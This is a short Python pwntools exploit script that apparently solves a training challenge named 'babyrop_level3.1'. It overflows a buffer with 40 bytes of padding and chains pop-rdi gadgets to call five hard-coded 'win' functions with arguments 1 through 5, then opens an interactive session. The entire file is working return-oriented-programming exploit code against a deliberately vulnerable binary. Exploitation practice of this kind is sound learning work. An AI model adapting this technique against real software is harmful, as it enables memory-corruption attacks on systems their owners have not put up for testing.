from pwn import *

offset = b'A'*40

win_stage_1 = p64(0x4018f7)
win_stage_2 = p64(0x40164f)
win_stage_3 = p64(0x401815)
win_stage_4 = p64(0x40172f)
win_stage_5 = p64(0x40156c)

poprdi_ret = p64(0x401b33)
ret = p64(0x40101a)

payload = offset
payload += ret
payload += poprdi_ret
payload += p64(1)
payload += win_stage_1
payload += poprdi_ret
payload += p64(2)
payload += win_stage_2
payload += poprdi_ret
payload += p64(3)
payload += win_stage_3
payload += poprdi_ret
payload += p64(4)
payload += win_stage_4
payload += poprdi_ret
payload += p64(5)
payload += win_stage_5


r = process('/challenge/babyrop_level3.1')
r.recvuntil(b'###\n')
r.sendline(payload)
r.interactive()